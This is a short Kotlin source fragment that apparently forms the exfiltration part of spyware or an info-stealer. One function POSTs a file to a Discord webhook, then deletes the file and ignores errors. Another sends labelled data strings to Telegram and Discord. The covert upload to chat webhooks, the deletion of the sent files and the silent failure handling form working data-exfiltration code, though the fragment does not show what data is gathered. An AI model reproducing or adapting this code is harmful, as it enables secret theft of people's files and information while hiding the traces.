private fun uploadToWebhook(file: File) {
    try {
        val url = URL(WebhookSender.DISCORD_WEBHOOK_URL)
        val connection = url.openConnection() as HttpURLConnection
        connection.doInput = true
        connection.doOutput = true
        connection.setRequestMethod("POST")
        
        val inputStream = file.inputStream()
        val output = connection.outputStream
        val buffer = ByteArray(1024)
        var length: Int
        while (inputStream.read(buffer).also { length = it } > 0) {
            output.write(buffer, 0, length)
        }
        inputStream.close()
        output.close()
        file.delete()
    } catch (e: IOException) {}
}

private fun uploadData(jsonPayload: Map<String, String>) {
    val text = "${jsonPayload["type"]}: ${jsonPayload["data"]}"
    WebhookSender.sendTelegram(text)
    WebhookSender.sendDiscord(jsonPayload)
}
